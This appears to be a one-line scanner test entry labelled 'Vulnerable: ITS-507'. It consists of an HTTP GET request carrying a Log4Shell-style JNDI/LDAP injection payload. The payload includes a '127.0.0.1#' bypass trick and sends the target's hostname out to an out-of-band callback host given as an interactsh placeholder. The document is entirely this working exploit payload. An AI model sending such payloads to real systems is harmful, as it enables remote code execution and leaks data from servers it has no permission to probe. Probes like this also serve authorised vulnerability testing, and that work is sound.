# Vulnerable: ITS-507
GET /?x=${jndi:ldap://127.0.0.1#.${hostName}.{{interactsh-url}}/a}
